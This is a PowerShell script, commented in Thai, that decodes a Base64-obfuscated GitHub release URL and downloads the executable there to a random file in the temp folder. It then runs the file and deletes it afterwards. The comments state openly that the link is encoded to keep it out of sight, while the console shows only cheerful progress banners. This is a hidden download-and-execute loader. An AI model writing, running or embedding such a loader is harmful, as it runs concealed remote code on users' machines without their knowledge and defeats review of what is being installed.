# run-hidden.ps1
# ============================================
# รันไฟล์ EXE จาก GitHub (ลิงก์ซ่อนใน Base64)
# ============================================

# ค่า Base64 ของลิงก์ (ซ่อนไว้ ไม่เห็นลิงก์ตรงๆ)
$base64 = "aHR0cHM6Ly9naXRodWIuY29tL2F1ZGVuMTMxMzEzL2Z2dnZpZTMzMzMzMzMzMzMzMy9yZWxlYXNlcy9kb3dubG9hZC92MS4wL2FsbGxlYXdld2FlYXcuZXhl"

# ถอด Base64 กลับเป็นลิงก์ปกติ
$ลิงก์ = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))

# ตั้งค่าไฟล์ชั่วคราว
$ไฟล์ชั่วคราว = "$env:TEMP\temp_$(Get-Random).exe"

# เริ่มทำงาน
Clear-Host
Write-Host ""
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     ดาวน์โหลดและรันแอพจาก GitHub        ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

Write-Host "📥 กำลังดาวน์โหลด..." -ForegroundColor Yellow

try {
    # ดาวน์โหลดไฟล์
    Invoke-WebRequest -Uri $ลิงก์ -OutFile $ไฟล์ชั่วคราว -UseBasicParsing
    
    # เช็คว่าดาวน์โหลดสำเร็จ
    if (Test-Path $ไฟล์ชั่วคราว) {
        $ขนาด = [math]::Round((Get-Item $ไฟล์ชั่วคราว).Length / 1MB, 2)
        Write-Host "✅ ดาวน์โหลดสำเร็จ! (ขนาด: $ขนาด MB)" -ForegroundColor Green
        Write-Host ""
        
        # รันโปรแกรม
        Write-Host "▶️ กำลังรันโปรแกรม..." -ForegroundColor Yellow
        Write-Host "   (โปรแกรมจะทำงาน รอจนกว่าโปรแกรมจะปิด)" -ForegroundColor Gray
        Start-Process -FilePath $ไฟล์ชั่วคราว -Wait
        
        Write-Host ""
        Write-Host "✅ โปรแกรมทำงานเสร็จเรียบร้อย!" -ForegroundColor Green
    }
    
} catch {
    Write-Host ""
    Write-Host "❌ เกิดข้อผิดพลาด!" -ForegroundColor Red
    Write-Host "❗ สาเหตุ: $($_.Exception.Message)" -ForegroundColor Red
    
} finally {
    # ลบไฟล์ชั่วคราว
    if (Test-Path $ไฟล์ชั่วคราว) {
        Remove-Item $ไฟล์ชั่วคราว -Force
        Write-Host "🗑️ ลบไฟล์ชั่วคราวเรียบร้อย" -ForegroundColor Gray
    }
}

Write-Host ""
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║               เสร็จสิ้น                    ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "กดปุ่มใดๆ เพื่อปิดหน้าต่างนี้..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")